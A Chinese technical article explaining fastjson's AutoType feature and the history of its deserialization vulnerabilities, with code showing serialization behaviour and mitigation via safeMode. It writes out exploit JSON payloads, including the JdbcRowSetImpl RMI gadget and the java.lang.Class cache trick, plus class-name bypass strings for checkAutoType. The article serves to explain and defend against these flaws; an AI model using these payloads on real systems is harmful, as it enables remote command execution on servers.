# 典型回答

当我们使用fastjson进行序列化的时候，当一个类中包含了一个接口（或抽象类）的时候，会将子类型抹去，只保留接口（抽象类）的类型，使得反序列化时无法拿到原始类型。

那么为了解决这个问题，fastjson引入了AutoType，即在序列化的时候，把原始类型记录下来。

因为有了autoType功能，那么fastjson在对JSON字符串进行反序列化的时候，就会读取`@type`到内容，试图把JSON内容反序列化成这个对象，并且会调用这个类的setter方法。

那么这个特性就可能被利用，攻击者自己构造一个JSON字符串，并且使用`@type`指定一个自己想要使用的攻击类库实现攻击。

举个例子，黑客比较常用的攻击类库是`com.sun.rowset.JdbcRowSetImpl`，这是sun官方提供的一个类库，这个类的dataSourceName支持传入一个rmi的源，当解析这个uri的时候，就会支持rmi远程调用，去指定的rmi地址中去调用方法。

而fastjson在反序列化时会调用目标类的setter方法，那么如果黑客在JdbcRowSetImpl的dataSourceName中设置了一个想要执行的命令，那么就会导致很严重的后果。

如通过以下方式定一个JSON串，即可实现远程命令执行（在早期版本中，新版本中JdbcRowSetImpl已经被加了黑名单）

    `{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://localhost:1099/Exploit","autoCommit":true}`<br />    <br />**这就是所谓的远程命令执行漏洞，即利用漏洞入侵到目标服务器，通过服务器执行命令。**
# 扩展知识
### 
### AutoType 

fastjson的主要功能就是将Java Bean序列化成JSON字符串，这样得到字符串之后就可以通过数据库等方式进行持久化了。

但是，fastjson在序列化以及反序列化的过程中并没有使用Java自带的序列化机制，而是自定义了一套机制。

其实，对于JSON框架来说，想要把一个Java对象转换成字符串，可以有两种选择：

- 1、基于属性
- 2、基于setter/getter

而我们所常用的JSON序列化框架中，FastJson和jackson在把对象序列化成json字符串的时候，是通过遍历出该类中的所有getter方法进行的。Gson并不是这么做的，他是通过反射遍历该类中的所有属性，并把其值序列化成json。

假设我们有以下一个Java类：

```
class Store {
    private String name;
    private Fruit fruit;
    public String getName() {
        return name;
    }
    public void setName(String name) {
        this.name = name;
    }
    public Fruit getFruit() {
        return fruit;
    }
    public void setFruit(Fruit fruit) {
        this.fruit = fruit;
    }
}

interface Fruit {
}

class Apple implements Fruit {
    private BigDecimal price;
    //省略 setter/getter、toString等
}
```

**当我们要对他进行序列化的时候，fastjson会扫描其中的getter方法，即找到getName和getFruit，这时候就会将name和fruit两个字段的值序列化到JSON字符串中。**

那么问题来了，我们上面的定义的Fruit只是一个接口，序列化的时候fastjson能够把属性值正确序列化出来吗？如果可以的话，那么反序列化的时候，fastjson会把这个fruit反序列化成什么类型呢？

我们尝试着验证一下，基于(fastjson v 1.2.68)：

```
Store store = new Store();
store.setName("Hollis");
Apple apple = new Apple();
apple.setPrice(new BigDecimal(0.5));
store.setFruit(apple);
String jsonString = JSON.toJSONString(store);
System.out.println("toJSONString : " + jsonString);
```

以上代码比较简单，我们创建了一个store，为他指定了名称，并且创建了一个Fruit的子类型Apple，然后将这个store使用`JSON.toJSONString`进行序列化，可以得到以下JSON内容：

```
toJSONString : {"fruit":{"price":0.5},"name":"Hollis"}
```

那么，这个fruit的类型到底是什么呢，能否反序列化成Apple呢？我们再来执行以下代码：

```
Store newStore = JSON.parseObject(jsonString, Store.class);
System.out.println("parseObject : " + newStore);
Apple newApple = (Apple)newStore.getFruit();
System.out.println("getFruit : " + newApple);
```

执行结果如下：

```
toJSONString : {"fruit":{"price":0.5},"name":"Hollis"}
parseObject : Store{name='Hollis', fruit={}}
Exception in thread "main" java.lang.ClassCastException: com.hollis.lab.fastjson.test.$Proxy0 cannot be cast to com.hollis.lab.fastjson.test.Apple
at com.hollis.lab.fastjson.test.FastJsonTest.main(FastJsonTest.java:26)
```

可以看到，在将store反序列化之后，我们尝试将Fruit转换成Apple，但是抛出了异常，尝试直接转换成Fruit则不会报错，如：

```
Fruit newFruit = newStore.getFruit();
System.out.println("getFruit : " + newFruit);
```

以上现象，我们知道，**当一个类中包含了一个接口（或抽象类）的时候，在使用fastjson进行序列化的时候，会将子类型抹去，只保留接口（抽象类）的类型，使得反序列化时无法拿到原始类型。**

那么有什么办法解决这个问题呢，fastjson引入了AutoType，即在序列化的时候，把原始类型记录下来。<br />使用方法是通过`SerializerFeature.WriteClassName`进行标记，即将上述代码中的

```
String jsonString = JSON.toJSONString(store);
```

修改成：

```
String jsonString = JSON.toJSONString(store,SerializerFeature.WriteClassName);
```

即可，以上代码，输出结果如下：

```
System.out.println("toJSONString : " + jsonString);

{
    "@type":"com.hollis.lab.fastjson.test.Store",
    "fruit":{
        "@type":"com.hollis.lab.fastjson.test.Apple",
        "price":0.5
    },
    "name":"Hollis"
}
```

可以看到，**使用**`**SerializerFeature.WriteClassName**`**进行标记后，JSON字符串中多出了一个**`**@type**`**字段，标注了类对应的原始类型，方便在反序列化的时候定位到具体类型**

如上，将序列化后的字符串在反序列化，既可以顺利的拿到一个Apple类型，整体输出内容：

```
toJSONString : {"@type":"com.hollis.lab.fastjson.test.Store","fruit":{"@type":"com.hollis.lab.fastjson.test.Apple","price":0.5},"name":"Hollis"}
parseObject : Store{name='Hollis', fruit=Apple{price=0.5}}
getFruit : Apple{price=0.5}
```

这就是AutoType，以及fastjson中引入AutoType的原因。

但是，也正是这个特性，因为在功能设计之初在安全方面考虑的不够周全，也给后续fastjson使用者带来了无尽的痛苦

### AutoType 何错之有？

因为有了autoType功能，那么fastjson在对JSON字符串进行反序列化的时候，就会读取`@type`到内容，试图把JSON内容反序列化成这个对象，并且会调用这个类的setter方法。

那么就可以利用这个特性，自己构造一个JSON字符串，并且使用`@type`指定一个自己想要使用的攻击类库。

举个例子，黑客比较常用的攻击类库是`com.sun.rowset.JdbcRowSetImpl`，这是sun官方提供的一个类库，这个类的dataSourceName支持传入一个rmi的源，当解析这个uri的时候，就会支持rmi远程调用，去指定的rmi地址中去调用方法。

而fastjson在反序列化时会调用目标类的setter方法，那么如果黑客在JdbcRowSetImpl的dataSourceName中设置了一个想要执行的命令，那么就会导致很严重的后果。

如通过以下方式定一个JSON串，即可实现远程命令执行（在早期版本中，新版本中JdbcRowSetImpl已经被加了黑名单）

```
{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://localhost:1099/Exploit","autoCommit":true}
```

**这就是所谓的远程命令执行漏洞，即利用漏洞入侵到目标服务器，通过服务器执行命令。**

在早期的fastjson版本中（v1.2.25 之前），因为AutoType是默认开启的，并且也没有什么限制，可以说是裸着的。

从v1.2.25开始，fastjson默认关闭了autotype支持，并且加入了checkAutotype，加入了黑名单+白名单来防御autotype开启的情况。

但是，也是从这个时候开始，黑客和fastjson作者之间的博弈就开始了。

因为fastjson默认关闭了autotype支持，并且做了黑白名单的校验，所以攻击方向就转变成了"如何绕过checkAutotype"。

下面就来细数一下各个版本的fastjson中存在的漏洞以及攻击原理，**由于篇幅限制，这里并不会讲解的特别细节，如果大家感兴趣我后面可以单独写一篇文章讲讲细节**。下面的内容主要是提供一些思路，目的是说明写代码的时候注意安全性的重要性。

#### 绕过checkAutotype，黑客与fastjson的博弈

在fastjson v1.2.41 之前，在checkAutotype的代码中，会先进行黑白名单的过滤，如果要反序列化的类不在黑白名单中，那么才会对目标类进行反序列化。

但是在加载的过程中，fastjson有一段特殊的处理，那就是在具体加载类的时候会去掉className前后的`L`和`;`，形如`Lcom.lang.Thread;`。

![](http://www.hollischuang.com/wp-content/uploads/2020/07/15938462506312.jpg#id=oRHMz&originHeight=422&originWidth=1706&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)￼

而黑白名单又是通过startWith检测的，那么黑客只要在自己想要使用的攻击类库前后加上`L`和`;`就可以绕过黑白名单的检查了，也不耽误被fastjson正常加载。

如`Lcom.sun.rowset.JdbcRowSetImpl;`，会先通过白名单校验，然后fastjson在加载类的时候会去掉前后的`L`和`;变成了`com.sun.rowset.JdbcRowSetImpl`。

为了避免被攻击，在之后的 v1.2.42版本中，在进行黑白名单检测的时候，fastjson先判断目标类的类名的前后是不是`L`和`;`，如果是的话，就截取掉前后的`L`和`;`再进行黑白名单的校验。

看似解决了问题，但是黑客发现了这个规则之后，就在攻击时在目标类前后双写`LL`和`;;`，这样再被截取之后还是可以绕过检测。如`LLcom.sun.rowset.JdbcRowSetImpl;;`

魔高一尺，道高一丈。在 v1.2.43中，fastjson这次在黑白名单判断之前，增加了一个是否以`LL`未开头的判断，如果目标类以`LL`开头，那么就直接抛异常，于是就又短暂的修复了这个漏洞。

黑客在`L`和`;`这里走不通了，于是想办法从其他地方下手，因为fastjson在加载类的时候，不只对`L`和`;`这样的类进行特殊处理，还对`[`也被特殊处理了。

同样的攻击手段，在目标类前面添加`[`，v1.2.43以前的所有版本又沦陷了。

于是，在 v1.2.44版本中，fastjson的作者做了更加严格的要求，只要目标类以`[`开头或者以`;`结尾，都直接抛异常。也就解决了 v1.2.43及历史版本中发现的bug。

在之后的几个版本中，黑客的主要的攻击方式就是绕过黑名单了，而fastjson也在不断的完善自己的黑名单。

#### autoType不开启也能被攻击？

但是好景不长，在升级到 v1.2.47 版本时，黑客再次找到了办法来攻击。而且这个攻击只有在autoType关闭的时候才生效。

是不是很奇怪，autoType不开启反而会被攻击。

因为**在fastjson中有一个全局缓存，在类加载的时候，如果autotype没开启，会先尝试从缓存中获取类，如果缓存中有，则直接返回。**黑客正是利用这里机制进行了攻击。

黑客先想办法把一个类加到缓存中，然后再次执行的时候就可以绕过黑白名单检测了，多么聪明的手段。

首先想要把一个黑名单中的类加到缓存中，需要使用一个不在黑名单中的类，这个类就是`java.lang.Class`

`java.lang.Class`类对应的deserializer为MiscCodec，反序列化时会取json串中的val值并加载这个val对应的类。

如果fastjson cache为true，就会缓存这个val对应的class到全局缓存中

如果再次加载val名称的类，并且autotype没开启，下一步就是会尝试从全局缓存中获取这个class，进而进行攻击。

所以，黑客只需要把攻击类伪装以下就行了，如下格式：

```
{"@type": "java.lang.Class","val": "com.sun.rowset.JdbcRowSetImpl"}
```

于是在 v1.2.48中，fastjson修复了这个bug，在MiscCodec中，处理Class类的地方，设置了fastjson cache为false，这样攻击类就不会被缓存了，也就不会被获取到了。

在之后的多个版本中，黑客与fastjson又继续一直都在绕过黑名单、添加黑名单中进行周旋。

直到后来，黑客在 v1.2.68之前的版本中又发现了一个新的漏洞利用方式。

#### 利用异常进行攻击

在fastjson中， 如果，[@type ](/type ) 指定的类为 Throwable 的子类，那对应的反序列化处理类就会使用到 ThrowableDeserializer 

而在ThrowableDeserializer#deserialze的方法中，当有一个字段的key也是 @type时，就会把这个 value 当做类名，然后进行一次 checkAutoType 检测。

并且指定了expectClass为Throwable.class，但是**在checkAutoType中，有这样一约定，那就是如果指定了expectClass ，那么也会通过校验。**

![](http://www.hollischuang.com/wp-content/uploads/2020/07/15938495572144.jpg#id=MXPrL&originHeight=322&originWidth=1738&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)￼

因为fastjson在反序列化的时候会尝试执行里面的getter方法，而Exception类中都有一个getMessage方法。

黑客只需要自定义一个异常，并且重写其getMessage就达到了攻击的目的。

**这个漏洞就是6月份全网疯传的那个"严重漏洞"，使得很多开发者不得不升级到新版本。**

这个漏洞在 v1.2.69中被修复，主要修复方式是对于需要过滤掉的expectClass进行了修改，新增了4个新的类，并且将原来的Class类型的判断修改为hash的判断。

其实，根据fastjson的官方文档介绍，即使不升级到新版，在v1.2.68中也可以规避掉这个问题，那就是使用safeMode

### AutoType 安全模式？

可以看到，这些漏洞的利用几乎都是围绕AutoType来的，于是，在 v1.2.68版本中，引入了safeMode，配置safeMode后，无论白名单和黑名单，都不支持autoType，可一定程度上缓解反序列化Gadgets类变种攻击。

设置了safeMode后，@type  字段不再生效，即当解析形如{"@type": "com.java.class"}的JSON串时，将不再反序列化出对应的类。 

开启safeMode方式如下：

```
ParserConfig.getGlobalInstance().setSafeMode(true);
```

如在本文的最开始的代码示例中，使用以上代码开启safeMode模式，执行代码，会得到以下异常：

```
Exception in thread "main" com.alibaba.fastjson.JSONException: safeMode not support autoType : com.hollis.lab.fastjson.test.Apple
at com.alibaba.fastjson.parser.ParserConfig.checkAutoType(ParserConfig.java:1244)
```

但是值得注意的是，使用这个功能，fastjson会直接禁用autoType功能，即在checkAutoType方法中，直接抛出一个异常。

![](http://www.hollischuang.com/wp-content/uploads/2020/07/15938532891003.jpg#id=OI1SG&originHeight=908&originWidth=1642&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

开发者可以将自己项目中使用的fastjson升级到最新版，并且如果代码中不需要用到AutoType的话，可以考虑使用safeMode，但是要评估下对历史代码的影响。

因为**fastjson自己定义了序列化工具类，并且使用asm技术避免反射、使用缓存、并且做了很多算法优化等方式，大大提升了序列化及反序列化的效率。**

之前有网友对比过：

![](http://www.hollischuang.com/wp-content/uploads/2020/07/15938545656293.jpg#id=KdVAp&originHeight=788&originWidth=1616&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

当然，**快的同时也带来了一些安全性问题，这是不可否认的。**

